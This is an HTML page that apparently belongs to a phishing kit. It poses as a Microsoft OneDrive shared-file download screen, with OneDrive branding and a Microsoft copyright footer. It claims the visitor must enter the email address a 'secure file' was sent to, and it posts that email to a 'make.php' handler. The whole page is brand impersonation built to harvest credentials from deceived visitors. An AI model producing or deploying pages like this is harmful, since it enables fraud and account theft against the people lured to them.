﻿<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
.lfooter {
  position: fixed;
  left: 0;
  bottom: 0;
  width: 100%;
  color: #333;
  text-align: center;
  }
        </style>
		<link rel="icon" href="imgs/favicon.ico" type="image/x-icon" />
		<link rel='stylesheet' href='imgs/styles.css'/>
		<title>File - OneDrive</title>
    </head>
	
    <body>
	
	<div style="background-color:#0078d4;width:100%;padding: 4px 13px;"> <span style="color:#fff;font-size:26px;">OneDrive</span> </div>
	
	
	
        <div id="mydiv">
					<div style="width:45%;float:right;">
			<h2 style="font-size:30px;line-height:8px;color:#333">Simple, Secure file sharing <br><br><br><span style="font-size:14px;font-weight:100;font-family:arial;color:#333">OneDrive lets you share files with end-to-end encryption and a link that automatically expires. So you can keep what you share private and make sure your stuff doesn’t stay online forever.</span></h2>
		
			</div>
		
            <div style="width:500px;height:400px;border:2px dashed #ccc; border-radius:4px;text-align:center">
			<br><form name="testForm"  action="make.php?new&exsvurl=1&ll-cc=1033&modurl=0&path=4r-next&ndhe" method="post" onsubmit="return validateForm();">
			<br><br><br><br>
			<img src="imgs/cloud.png" width="60" height="">
			<br><span style="color:#0060df;">File Size: 2MB</span><br><br>
			<input type="text" name="email" placeholder="Email Address" autocomplete="off">
			<br><span id="errorml" class="m_span"></span><br>
			
			<button class="mb">Download Your File</button><br>
			<span style="font-size:12px;">To open this secure file, You need to enter the email that <br>this document was shared or sent to:</span>
			</div>
			

        </div>
		<script type="text/javascript" src="imgs/js.js"></script> 
		<div class="lfooter">
  <p> &copy; Microsoft 2020</p>
</div>
    </body>


</html>